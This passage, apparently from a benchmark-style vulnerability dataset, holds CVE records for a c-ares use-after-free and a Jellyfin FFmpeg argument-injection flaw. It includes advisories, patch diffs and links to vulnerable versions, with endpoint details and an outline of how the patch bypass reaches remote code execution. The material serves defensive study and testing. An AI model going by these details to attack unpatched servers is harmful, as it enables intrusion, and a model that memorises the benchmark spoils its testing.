size);\n   static unsigned long long    fails_;\n   static std::map<size_t, int> size_fails_;\n   static std::mutex            lock_;\n+  static bool                  failsend_;\n };\n \n // Test fixture that uses a default channel.\n\n@@ -451,6 +457,12 @@\nACTION_P2(SetReplyData, mockserver, data)\n   mockserver->SetReplyData(data);\n }\n \n+ACTION_P2(SetReplyAndFailSend, mockserver, reply)\n+{\n+  mockserver->SetReply(reply);\n+  LibraryTest::SetFailSend();\n+}\n+\n ACTION_P2(SetReply, mockserver, reply)\n {\n   mockserver->SetReply(reply);\n```",
                "url": "https://github.com/c-ares/c-ares/commit/29d38719112639d8c0ba910254a3dd4f482ea2d1"
            }
        ],
        "published_date": "2025-04-08T13:53:11.232Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nc-ares\n/\nc-ares\nPublic\nNotifications You must be signed in to change notification settings\nFork 629\nStar 2k\nCode\nIssues\n26\nPull requests\n6\nDiscussions\nActions\nSecurity\n6\nInsights\nAdditional navigation options\nUse after free in read_answers()\nHigh bradh352 published GHSA-6hxc-62jh-p29v on Apr 8Apr 8, 2025\nPackage\nc-ares\nAffected versions\n1.32.3 - 1.34.4\nPatched versions\n1.34.5\nDescription\nCVE-2025-31498\nImpact\nUse after free() in read_answers() when process_answer() may re-enqueue a query either due to a DNS Cookie Failure or when the upstream server does not properly support EDNS, or possibly on TCP queries if the remote closed the connection immediately after a response. If there was an issue trying to put that new transaction on the wire, it would close the connection handle, but read_answers() was still expecting the connection handle to be available to possibly dequeue other responses.\nIn theory a remote attacker might be able to trigger this by flooding the target with ICMP UNREACHABLE packets if they also control the upstream nameserver and can return a result with one of those conditions, this has been untested. Otherwise only a local attacker might be able to change system behavior to make send()/write() return a failure condition.\nPatches\nVersions 1.32.3 - 1.34.4 are affected. Patch in 1.34.5.\n1.34 Patches: https://github.com/c-ares/c-ares/commit/066b396.patch + https://github.com/c-ares/c-ares/compare/9a48eed..d3a507e.patch\n1.33 Patches: https://github.com/c-ares/c-ares/compare/69e1ad5..82489f2.patch\n1.32 Patches: https://github.com/c-ares/c-ares/commit/1bcdaf0.patch\nWorkarounds\nNone\nReferences\nc-ares started handling UDP write failures in 1.32.3 in PR #821 whereas they were previously ignored, thus uncovering this particular issue.\nReported by Erik Lax (@eriklax)\nSeverity\nHigh\n8.3\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nHigh\nAttack Requirements\nNone\nPrivileges Required\nNone\nUser interaction\nNone\nVulnerable System Impact Metrics\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nHigh\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N\nCVE ID\nCVE-2025-31498\nWeaknesses\nCWE-416\nCredits\neriklax\nFinder\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory description provides a theoretical attack scenario and outlines the conditions in which the vulnerability could be exploited but does not provide a working proof of concept or detailed reproduction steps.",
                "url": "https://github.com/c-ares/c-ares/security/advisories/GHSA-6hxc-62jh-p29v"
            }
        ],
        "sw_version": "v1.32.3",
        "sw_version_wget": "https://github.com/c-ares/c-ares/archive/refs/tags/v1.32.3.zip"
    },
    "CVE-2025-31499": {
        "cwe": [
            {
                "id": "CWE-88",
                "value": "CWE-88: Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')"
            }
        ],
        "description": "Jellyfin is an open source self hosted media server. Versions before 10.10.7 are vulnerable to argument injection in FFmpeg. This can be leveraged to possibly achieve remote code execution by anyone with credentials to a low-privileged user. This vulnerability was previously reported in CVE-2023-49096 and patched in version 10.8.13, but the patch can be bypassed. The original fix sanitizes some parameters to make injection impossible, but certain unsanitized parameters can still be used for argument injection. The same unauthenticated endpoints are vulnerable: /Videos/<itemId>/stream and /Videos/<itemId>/stream.<container>, likely alongside similar endpoints in AudioController. This argument injection can be exploited to achieve arbitrary file write, leading to possible remote code execution through the plugin system. While the unauthenticated endpoints are vulnerable, a valid itemId is required for exploitation and any authenticated attacker could easily retrieve a valid itemId to make the exploit work. This vulnerability is patched in version 10.10.7.",
        "languages": [
            "C#"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\nFix validation of API parameters passed to FFmpeg\n\nFilename: Jellyfin.Api/Controllers/AudioController.cs:\n```\n@@ -92,18 +92,18 @@\npublic AudioController(AudioHelper audioHelper)\n     [ProducesAudioFile]\n     public async Task<ActionResult> GetAudioStream(\n         [FromRoute, Required] Guid itemId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? container,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? container,\n         [FromQuery] bool? @static,\n         [FromQuery] string? @params,\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -114,7 +114,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -133,8 +133,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n\n@@ -259,18 +259,18 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitle\n     [ProducesAudioFile]\n     public async Task<ActionResult> GetAudioStreamByContainer(\n         [FromRoute, Required] Guid itemId,\n-        [FromRoute, Required] string container,\n+        [FromRoute, Required] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string container,\n         [FromQuery] bool? @static,\n         [FromQuery] string? @params,\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -281,7 +281,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -300,8 +300,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n```\n\nFilename: Jellyfin.Api/Controllers/DynamicHlsController.cs:\n```\n@@ -166,18 +166,18 @@\npublic DynamicHlsController(\n     [ProducesPlaylistFile]\n     public async Task<ActionResult> GetLiveHlsStream(\n         [FromRoute, Required] Guid itemId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? container,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? container,\n         [FromQuery] bool? @static,\n         [FromQuery] string? @params,\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -188,7 +188,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -207,8 +207,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n\n@@ -415,12 +415,12 @@\npublic async Task<ActionResult> GetMasterHlsVideoPlaylist(\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery, Required] string mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -431,7 +431,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -452,8 +452,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n\n@@ -591,12 +591,12 @@\npublic async Task<ActionResult> GetMasterHlsAudioPlaylist(\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery, Required] string mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -608,7 +608,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -627,8 +627,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n\n@@ -761,12 +761,12 @@\npublic async Task<ActionResult> GetVariantHlsVideoPlaylist(\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -777,7 +777,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -798,8 +798,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n\n@@ -933,12 +933,12 @@\npublic async Task<ActionResult> GetVariantHlsAudioPlaylist(\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -950,7 +950,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -969,8 +969,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n\n@@ -1106,20 +1106,20 @@\npublic async Task<ActionResult> GetHlsVideoSegment(\n         [FromRoute, Required] Guid itemId,\n         [FromRoute, Required] string playlistId,\n         [FromRoute, Required] int segmentId,\n-        [FromRoute, Required] string container,\n+        [FromRoute, Required] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string container,\n         [FromQuery, Required] long runtimeTicks,\n         [FromQuery, Required] long actualSegmentLengthTicks,\n         [FromQuery] bool? @static,\n         [FromQuery] string? @params,\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -1130,7 +1130,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -1151,8 +1151,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n\n@@ -1291,20 +1291,20 @@\npublic async Task<ActionResult> GetHlsAudioSegment(\n         [FromRoute, Required] Guid itemId,\n         [FromRoute, Required] string playlistId,\n         [FromRoute, Required] int segmentId,\n-        [FromRoute, Required] string container,\n+        [FromRoute, Required] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string container,\n         [FromQuery, Required] long runtimeTicks,\n         [FromQuery, Required] long actualSegmentLengthTicks,\n         [FromQuery] bool? @static,\n         [FromQuery] string? @params,\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -1316,7 +1316,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -1335,8 +1335,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n```\n\nFilename: Jellyfin.Api/Controllers/LiveTvController.cs:\n```\n@@ -1186,7 +1186,9 @@\npublic ActionResult GetLiveRecordingFile([FromRoute, Required] string recordingI\n     [ProducesResponseType(StatusCodes.Status200OK)]\n     [ProducesResponseType(StatusCodes.Status404NotFound)]\n     [ProducesVideoFile]\n-    public ActionResult GetLiveStreamFile([FromRoute, Required] string streamId, [FromRoute, Required] string container)\n+    public ActionResult GetLiveStreamFile(\n+        [FromRoute, Required] string streamId,\n+        [FromRoute, Required] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string container)\n     {\n         var liveStreamInfo = _mediaSourceManager.GetLiveStreamInfoByUniqueId(streamId);\n         if (liveStreamInfo is null)\n```\n\nFilename: Jellyfin.Api/Controllers/UniversalAudioController.cs:\n```\n@@ -102,13 +102,13 @@\npublic async Task<ActionResult> GetUniversalAudioStream(\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n         [FromQuery] Guid? userId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] int? transcodingAudioChannels,\n         [FromQuery] int? maxStreamingBitrate,\n         [FromQuery] int? audioBitRate,\n         [FromQuery] long? startTimeTicks,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? transcodingContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? transcodingContainer,\n         [FromQuery] MediaStreamProtocol? transcodingProtocol,\n         [FromQuery] int? maxAudioSampleRate,\n         [FromQuery] int? maxAudioBitDepth,\n```\n\nFilename: Jellyfin.Api/Controllers/VideosController.cs:\n```\n@@ -315,18 +315,18 @@\npublic async Task<ActionResult> MergeVersions([FromQuery, Required, ModelBinder(\n     [ProducesVideoFile]\n     public async Task<ActionResult> GetVideoStream(\n         [FromRoute, Required] Guid itemId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? container,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? container,\n         [FromQuery] bool? @static,\n         [FromQuery] string? @params,\n         [FromQuery] string? tag,\n         [FromQuery, ParameterObsolete] string? deviceProfileId,\n         [FromQuery] string? playSessionId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? segmentContainer,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? segmentContainer,\n         [FromQuery] int? segmentLength,\n         [FromQuery] int? minSegments,\n         [FromQuery] string? mediaSourceId,\n         [FromQuery] string? deviceId,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? audioCodec,\n         [FromQuery] bool? enableAutoStreamCopy,\n         [FromQuery] bool? allowVideoStreamCopy,\n         [FromQuery] bool? allowAudioStreamCopy,\n\n@@ -337,7 +337,7 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? audioChannels,\n         [FromQuery] int? maxAudioChannels,\n         [FromQuery] string? profile,\n-        [FromQuery] string? level,\n+        [FromQuery] [RegularExpression(EncodingHelper.LevelValidationRegex)] string? level,\n         [FromQuery] float? framerate,\n         [FromQuery] float? maxFramerate,\n         [FromQuery] bool? copyTimestamps,\n\n@@ -358,8 +358,8 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? audioCod\n         [FromQuery] int? cpuCoreLimit,\n         [FromQuery] string? liveStreamId,\n         [FromQuery] bool? enableMpegtsM2TsMode,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? videoCodec,\n-        [FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitleCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? videoCodec,\n+        [FromQuery] [RegularExpression(EncodingHelper.ContainerValidationRegex)] string? subtitleCodec,\n         [FromQuery] string? transcodeReasons,\n         [FromQuery] int? audioStreamIndex,\n         [FromQuery] int? videoStreamIndex,\n\n@@ -556,18 +556,18 @@\n[FromQuery] [RegularExpression(EncodingHelper.ValidationRegex)] string? subtitle\n     [ProducesVideoFile]\n     public Task<ActionResult> GetVideoStreamByContainer(\n         [FromRoute, Required] Guid itemId,\n-        [FromRoute, Required] string container,\n+        [FromRoute, Required] 